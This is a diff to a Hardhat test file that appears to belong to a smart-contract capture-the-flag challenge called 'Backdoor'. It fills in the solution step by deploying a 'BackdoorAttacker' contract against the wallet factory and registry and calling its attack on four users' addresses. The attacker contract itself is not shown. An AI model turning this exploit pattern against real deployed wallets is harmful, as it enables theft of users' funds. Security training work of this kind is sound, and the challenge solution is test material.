@@ -43,9 +43,28 @@ describe('[Challenge] Backdoor', function () {
         // Transfer tokens to be distributed to the registry
         await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
     });
-
+/**
+ *   address proxyFactory_,
+        address token_,
+        address singleton_,
+        address callback_
+ */
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const backdoorAttacker = await (await ethers.getContractFactory('BackdoorAttacker')).deploy(
+            walletFactory.address,
+            token.address,
+            masterCopy.address,
+            walletRegistry.address
+        );
+
+        await backdoorAttacker.connect(player).attack(
+            [
+                alice.address,
+                bob.address,
+                charlie.address,
+                david.address
+            ]
+        );
     });
 
     after(async function () {
